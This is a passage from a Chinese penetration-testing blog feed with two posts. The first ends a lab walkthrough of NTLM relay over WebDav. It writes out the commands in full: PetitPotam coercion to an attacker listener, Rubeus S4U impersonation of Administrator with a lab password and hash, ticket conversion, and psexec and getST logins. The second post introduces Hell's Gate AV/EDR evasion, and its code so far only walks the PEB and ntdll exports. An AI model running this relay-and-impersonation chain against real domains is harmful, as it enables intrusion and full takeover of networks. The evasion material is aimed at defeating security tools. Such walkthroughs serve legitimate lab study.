<h5 id="0x2-域外认证"><a href="#0x2-域外认证" class="headerlink" title="0x2.域外认证"></a>0x2.域外认证</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 PetitPotam.py -u sharp -p Admin<span class="comment">#123 -d pentest.local evil@80/ad 10.0.10.110</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151852766.png" alt="image-20221030151852766"></p>
<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030151906831.png" alt="image-20221030151906831"></p>
<p>这时候，回到攻击机查看可以发现，我们此时已经通过<code>ws03$</code>的身份，创建了一个机器账户</p>
<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132543523.png" alt="image-20221030132543523"></p>
<p>这时我们回到域控查看WebDav服务器，可以发现<code>msDS-KeyCredentialLink</code> 属性已经被修改。</p>
<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030132832081.png" alt="image-20221030132832081"></p>
<h4 id="0x05-申请票据"><a href="#0x05-申请票据" class="headerlink" title="0x05 申请票据"></a>0x05 申请票据</h4><h5 id="0x1-域内申请票据"><a href="#0x1-域内申请票据" class="headerlink" title="0x1.域内申请票据"></a>0x1.域内申请票据</h5><p>此时，我们便可以通过S4U扩展协议来申请访问WebDav目标机的ST票据了。</p>
<p>将密码转为hash，便于我们进行使用Rubeus进行申请票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe hash /domain:pentest.local /user:RUVEPAFW$ /password:&#x27;gm9wPzATZ&lt;RT5Ei&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030143159039.png" alt="image-20221030143159039"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe s4u /user:RUVEPAFW<span class="variable">$</span> /rc4:<span class="number">4</span>A5AD55249E75BB39F928EFB55A8A81B  /impersonateuser:Administrator /msdsspn:host/ws03.pentest.local /altservice:cifs /nowrap /ptt</span><br></pre></td></tr></table></figure>

<p>由于开启了PTT模块，此时我们缓存中已经加载了申请来的ST票据，拥有了访问WS03机器共享目录权限。</p>
<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030143131796.png" alt="image-20221030143131796"></p>
<p>当然，我们也可以将申请到的kirbi票据除空格后解码base64，利用ticketConverter转为cacche格式，于域外利用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;payload&#x27;</span> | base64 -d &gt; administrator.kirbi</span><br><span class="line">python3 ticketConverter.py administrator.kirbi administrator.ccache </span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144027489.png" alt="image-20221030144027489"></p>
<p>将申请到的票据加载到环境变量中，使用psexec登陆远程服务器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=/opt/tools/impacket/examples/administrator.ccache</span><br><span class="line">python3 psexec.py -no-pass -k ws03.pentest.local</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030144213123.png" alt="image-20221030144213123"></p>
<h5 id="0x2-域外申请票据"><a href="#0x2-域外申请票据" class="headerlink" title="0x2.域外申请票据"></a>0x2.域外申请票据</h5><p>参考委派，使用机器账户身份申请ST票据</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 10.0.10.111 pentest/RUVEPAFW\$ -spn cifs/ws03.pentest.local -impersonate administrator</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E9%80%9A%E8%BF%87WebDav%E8%BF%9B%E8%A1%8CNTLM-Relay.assets/image-20221030153948639.png" alt="image-20221030153948639"></p>
<h3 id="0x5-参考文章"><a href="#0x5-参考文章" class="headerlink" title="0x5 参考文章"></a>0x5 参考文章</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.thehacker.recipes/ad/movement/mitm-<span class="keyword">and</span>-coerced-authentications/webclient</span><br><span class="line">https:<span class="regexp">//</span>www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Hell&#39;s Gate的一次尝试入门</title>
    <url>/2022/08/03/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><p>接触安全已经一年多了，在实习工作中跟进项目的时候，以前我的弱项也逐步暴露出来，并越发明显，我不懂<strong>免杀与工具开发</strong>，钓鱼、下马的工作无法顺利进行，几乎就是面向google的渗透测试工程。</p>
<p>我想，如果想要进一步的发展提升，便要开展这方面的学习了，遂有此篇博文。</p>
<p>Hell’s Gate，也就是地狱之门，算是一项经典的底层绕过AV或EDR的技术手段，利用syscall技术调用NTDLL内函数,从而绕过杀软对函数的检测。</p>
<span id="more"></span>

<h3 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2.前置知识"></a>2.前置知识</h3><h4 id="2-1-PEB的数据结构"><a href="#2-1-PEB的数据结构" class="headerlink" title="2.1 PEB的数据结构"></a>2.1 PEB的数据结构</h4><p><strong>PEB</strong>地址:</p>
<ul>
<li><p>​    在x86进程的线程进程块(<strong>TEB</strong>)中FS寄存器中的0x30偏移处找到。</p>
</li>
<li><p>​    在x64进程的线程进程块(<strong>TEB</strong>)中GS寄存器中的0x60偏移处找到。</p>
</li>
</ul>
<p>微软官方提供了可根据对应寄存器偏移位置读取内存的API:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readfsbyte-readfsdword-readfsqword-readfsword?view=msvc-170&viewFallbackFrom=vs-2019">__readfsqword</a>   (x86)</li>
<li><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-170&viewFallbackFrom=vs-2019">__readgsqword</a>  (x64)</li>
</ul>
<p>两个api可以在<code>dbghelp.h</code>、<code>winnt.h</code>中找到</p>
<p>进程环境块是一个从内核中分配给每个进程的用户模式结构，每一个进程都会有从Ring0层分配给该进程的进程环境块，在这里，我们主要需要了解<code>_PEB_LDR_DATA</code>以及其他子结构</p>
<p>在Crispr师傅博客处找到的一个示意图:</p>
<p>通过 _PEB 偏移位置0x30看出，PEB存放于以fs寄存器为基地址的0x30偏移处，由此可知该示意图是由x86进程作为展示模板。</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220804165338646.png" alt="image-20220804165338646"></p>
<p>使用windbg进行调试，可以看到TEB结构体中是存在PEB进程环境块的，此处使用的是x64程序进行演示。</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806115408926.png" alt="image-20220806115408926"></p>
<p>继续使用windbg跟进，我们可以看到_PEB结构体的组成，在这其中，我们目前最感兴趣的便是在0x018偏移处的Ldr。</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806115446148.png" alt="image-20220806115446148"></p>
<p>使用dt指令查看<code>_PEB_LDR_DATA</code>结构</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806150656942.png" alt="image-20220806150656942"></p>
<p>根据<a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">MSDN</a>可知，该结构体包含了进程已加载模块的信息，其中三个比较关键的成员含义如下所示：</p>
<ul>
<li><code>InLoadOrderModuleList</code>: 模块的加载顺序</li>
<li><code>InMemoryOrderModuleList</code>: 模块在内存中的排列顺序</li>
<li><code>InInitializationOrderModuleList</code>: 模块初始化的装载顺序</li>
</ul>
<p>三个成员皆为双向链表，每个双向链表都是指向进程装载的模块，结构中的每个指针，指向了一个<code>LDR_DATA_TABLE_ENTRY</code>的结构</p>
<p><code>_LDR_DATA_TABLE_ENTRY</code>结构</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderLinks</span>;</span>                                    <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderLinks</span>;</span>                                  <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderLinks</span>;</span>                          <span class="comment">//0x10</span></span><br><span class="line">    VOID* DllBase;                                                          <span class="comment">//0x18 模块基址</span></span><br><span class="line">    VOID* EntryPoint;                                                       <span class="comment">//0x1c</span></span><br><span class="line">    ULONG SizeOfImage;                                                      <span class="comment">//0x20</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">FullDllName</span>;</span>                                     <span class="comment">//0x24 模块路径+名称</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">BaseDllName</span>;</span>                                     <span class="comment">//0x2c 模块名称</span></span><br><span class="line">...</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>

<p>所以说<code>InMemoryOrderModuleList</code>里的<code>Flink</code>的地址，指向了一个<code>LDR_DATA_TABLE_ENTRY</code>,利用dt指令查看也确实是验证了这一点</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806151846476.png" alt="image-20220806151846476"></p>
<p>此时我们可以看到，当前<code>BaseDllName</code>的值为当前进程，在手工调试中，若想要循环遍历当前进程所加载的模块，我们可以利<code>InMemoryOrderLinks</code>成员的值，来查看下一个<code>_LDR_DATA_TABLE_ENTRY</code>中模块的信息，并由于是双向链表结构，当循环回到第一个<code>_LDR_DATA_TABLE_ENTRY</code>时，进程加载的模块遍历完毕。</p>
<h4 id="2-2-对进程模块进行遍历"><a href="#2-2-对进程模块进行遍历" class="headerlink" title="2.2 对进程模块进行遍历"></a>2.2 对进程模块进行遍历</h4><p>下面展示一下如何对进程的模块进行手工遍历：</p>
<h5 id="2-1-1-手工遍历"><a href="#2-1-1-手工遍历" class="headerlink" title="2.1.1 手工遍历"></a>2.1.1 手工遍历</h5><p>利用dt查找当前进程LDR结构体的信息，根据<code>InMemoryOrderModuleList</code>结构体中的Fink指向的<code>_LDR_DATA_TABLE_ENTRY</code>结构来查看当前进程在内存中加载模块的顺序。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">dt -r1 <span class="number">00007f</span>fdac05c4c0 _PEB_LDR_DATA </span><br></pre></td></tr></table></figure>

<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806153404407.png" alt="image-20220806153404407"></p>
<p>跟进<code>_LDR_DATA_TABLE_ENTRY结构</code>，可以注意到BaseDllName的值为乱码，这是因为内存对齐问题，我们在根据Flink值查找对应结构时，一定要减去16字节，以保证我们正确对齐（x86或x64皆如此）。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">dt -r1 <span class="number">0x000001a3</span>`<span class="number">6b</span>432a10 _LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806153850765.png" alt="image-20220806153850765"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">dt -r1 <span class="number">0x000001a3</span>`<span class="number">6b</span>432a10<span class="number">-0x10</span> _LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154243796.png" alt="image-20220806154243796"></p>
<p>内存中第一个加载的模块即程序本身我们已经找到，接下来便是根据<code>InMemoryOrderLinks</code>的值来查找下一个<code>_LDR_DATA_TABLE_ENTRY</code>中的模块了</p>
<p>InMemoryOrderLinks的详细结构：</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154828422.png" alt="image-20220806154828422"></p>
<p>我们需要的是InMemoryOrderLinks-&gt;Flink值。</p>
<p>成功找到第二个模块，ntdll.dll</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">dt -r1 <span class="number">0x000001a3</span>`<span class="number">6b</span>432880<span class="number">-0x10</span> _LDR_DATA_TABLE_ENTRY</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806154936619.png" alt="image-20220806154936619"></p>
<p>接下来便是重复操作，查InMemoryOrderLinks-&gt;Flink值来遍历下一个模块，此处不再演示。</p>
<h5 id="2-1-2-自动化操作"><a href="#2-1-2-自动化操作" class="headerlink" title="2.1.2 自动化操作"></a>2.1.2 自动化操作</h5><p>手工操作费时费力，本文对crispr师傅的代码做出了一些简单的更改，利用c++进行自动化打印进程模块</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);	</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLoadModule;	</span><br><span class="line">	pLoadModule =  (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink<span class="number">-0x10</span>);	</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pFirstLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - <span class="number">0x10</span>); </span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Module Name:%ws\r\nModule Base Address:%p\r\n\r\n&quot;</span>, pLoadModule-&gt;FullDllName.Buffer, pLoadModule, pLoadModule-&gt;DllBase);</span><br><span class="line">		pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pLoadModule-&gt;InMemoryOrderLinks.Flink<span class="number">-0x10</span>); </span><br><span class="line">	&#125; <span class="keyword">while</span> ((PLDR_DATA_TABLE_ENTRY)((PBYTE)pLoadModule-&gt;InMemoryOrderLinks.Flink - <span class="number">0x10</span>) != pFirstLoadModule); </span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220806161225003.png" alt="image-20220806161225003"></p>
<h4 id="2-3-遍历模块中的导出表"><a href="#2-3-遍历模块中的导出表" class="headerlink" title="2.3 遍历模块中的导出表"></a>2.3 遍历模块中的导出表</h4><p>上面我们成功拿到了内存中模块的基址，这样我们便有能力遍历进程中每个模块的导出地址表，这涉及到通过该基址去遍历PE头文件从而获取到导出地址表，可以简单的将其分为4个步骤:</p>
<ol>
<li>获取到每个模块的基址</li>
<li>拿到<code>_IMAGE_DOS_HEADER</code>,通过检查<code>dos-&gt;e_magic</code>是否等于<code>IMAGE_DOS_SIGNATURE</code>判断头文件是否正确</li>
<li>遍历<code>_IMAGE_NT_HEADER</code>、<code>_IMAGE_FILE_HEADER</code>、<code>_IMAGE_OPTIONAL_HEADER</code></li>
<li>在<code>_IMAGE_OPTIONAL_HEADER</code>中找到导出地址表，并将类型转为<code>_IMAGE_EXPORT_DIRECTORY</code></li>
</ol>
<p>PE文件头数据结构：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;                        <span class="comment">//PE文件头标志 =&gt; 4字节</span></span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;           <span class="comment">//标准PE头 =&gt; 20字节</span></span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader; <span class="comment">//扩展PE头 =&gt; 32位下224字节(0xE0) 64位下240字节(0xF0)</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure>

<p>因此当我们拿到PE头时，便可以通过如下代码最终将内存中模块的<code>OptionalHeader</code>转为<code>IMAGE_EXPORT_DIRECTORY</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - 0x10);</span></span><br><span class="line">	<span class="comment">//pFirstLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - 0x10);</span></span><br><span class="line">	PBYTE ImageBase;</span><br><span class="line">	PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//读取模块 x64位 gs寄存器0x60偏移  x86 fs寄存器0x30</span></span><br><span class="line">	PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">	<span class="comment">//读取进程中内存载入的第二个模块 ntdll.dll</span></span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLoadModule;</span><br><span class="line">	pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;Module Name:%ws\r\nModule BaseAddress:%p\r\n&quot;, pLoadModule-&gt;FullDllName.Buffer, pLoadModule-&gt;DllBase);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//将模块的基地址作为ImageBase</span></span><br><span class="line">	ImageBase = (PBYTE)pLoadModule-&gt;DllBase;</span><br><span class="line">	Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">	<span class="comment">//判断是否为正常PE头</span></span><br><span class="line">	<span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Pe Header Error %d\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Dos-&gt;lfanew指出相对于ImageBase IMAGE_NT_HEADERS的偏移  基地址+偏移量拿到IMAGE_NT_HEADERS的地址</span></span><br><span class="line">	Nt = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + Dos-&gt;e_lfanew);</span><br><span class="line">	<span class="comment">//与Nt类似，Pe头结构中再加上Signature所占大小得到标准pe头位置</span></span><br><span class="line">	File = (PIMAGE_FILE_HEADER)((PBYTE)ImageBase + (Dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)));</span><br><span class="line">	<span class="comment">//标准头地址+标准头的大小得到扩展头位置</span></span><br><span class="line">	Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_FILE_HEADER));</span><br><span class="line">	<span class="comment">//根据DataDirectory结构很轻松的能拿到导出地址表的VirtualAddress</span></span><br><span class="line">	ExportTable = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处我们获得导出表(EAT)的方法是:</p>
<ul>
<li>IMAGE_DOS_HEADER：利用ImageBase基址转化而成。</li>
<li>IMAGE_NT_HEADER：利用Dos头地址 + Dos头成员e_lfanew处的偏移量得到。</li>
<li>IMAGE_FILE_HEADER：根据PE文件头的结构可知，File头的起始地址可利用Dos部首基址 + e_lfanew成员的偏移量 + 一个DWORD的大小推出。</li>
<li>IMAGE_OPTIONAL_HEADER：File头基址 + File头大小便是扩展PE头的地址。</li>
</ul>
<p>根据这个逻辑，我们可以在扩展头的DataDirectory中，拿到导出表的所在地址。</p>
<p>对导出表中的函数进行遍历，我们可以通过：</p>
<ol>
<li>FunctionNameAddressArray 一个包含函数名称的数组</li>
<li>FunctionOrdinalAddressArray  充当函数寻址数组的索引</li>
<li>FunctionAddressArray 一个包含函数地址的数组</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - 0x10);</span></span><br><span class="line">	<span class="comment">//pFirstLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink - 0x10);</span></span><br><span class="line">	PBYTE ImageBase;</span><br><span class="line">	PIMAGE_NT_HEADERS Nt = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DOS_HEADER Dos = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER File = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER Optional = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY ExportTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	PPEB Peb = (PPEB)__readgsqword(<span class="number">0x60</span>);</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLoadModule;</span><br><span class="line">	pLoadModule = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - <span class="number">0x10</span>);</span><br><span class="line">		<span class="comment">//输出当前模块名</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Module Name:%ws\r\nModule Address:%p&quot;</span>, pLoadModule-&gt;FullDllName.Buffer, pLoadModule-&gt;DllBase);</span><br><span class="line">    </span><br><span class="line">	ImageBase = (PBYTE)pLoadModule-&gt;DllBase;</span><br><span class="line">	Dos = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">	<span class="comment">//判断是否为正常PE头</span></span><br><span class="line">	<span class="keyword">if</span> (Dos-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Pe Header Error %d\r\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Dos-&gt;lfanew指出相对于ImageBase IMAGE_NT_HEADERS的偏移  基地址+偏移量拿到IMAGE_NT_HEADERS的地址</span></span><br><span class="line">	Nt = (PIMAGE_NT_HEADERS)((PBYTE)ImageBase + Dos-&gt;e_lfanew);</span><br><span class="line">	<span class="comment">//与Nt类似，Pe头结构中再加上Signature所占大小得到标准pe头位置</span></span><br><span class="line">	File = (PIMAGE_FILE_HEADER)((PBYTE)ImageBase + (Dos-&gt;e_lfanew + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)));</span><br><span class="line">	<span class="comment">//标准头地址+标准头的大小得到扩展头位置</span></span><br><span class="line">	Optional = (PIMAGE_OPTIONAL_HEADER)((PBYTE)File + <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_FILE_HEADER));</span><br><span class="line">	<span class="comment">//根据DataDirectory结构很轻松的能拿到导出地址表的VirtualAddress</span></span><br><span class="line">	ExportTable = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ImageBase + Optional-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//导出函数地址表</span></span><br><span class="line">	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfFunctions));</span><br><span class="line">	<span class="comment">//导出函数名称表</span></span><br><span class="line">    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)(ImageBase + ExportTable-&gt;AddressOfNames));</span><br><span class="line">	<span class="comment">//导出函数名称序号表</span></span><br><span class="line">    PWORD pdwAddressOfNameOrdinales = (PWORD)((PBYTE)ImageBase + ExportTable-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; ExportTable-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">		PCHAR pFunctionName = (PCHAR)((PBYTE)ImageBase + pdwAddressOfNames[i]);</span><br><span class="line">		PVOID pFunctionAddress = (PBYTE)ImageBase + pdwAddressOfFunctions[pdwAddressOfNameOrdinales[i]];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Function Name:%s\r\nFunction Address:%p\r\n&quot;</span>, pFunctionName, pFunctionAddress);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功读取ntdll.dll中的导出函数表</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807161115532.png" alt="image-20220807161115532"></p>
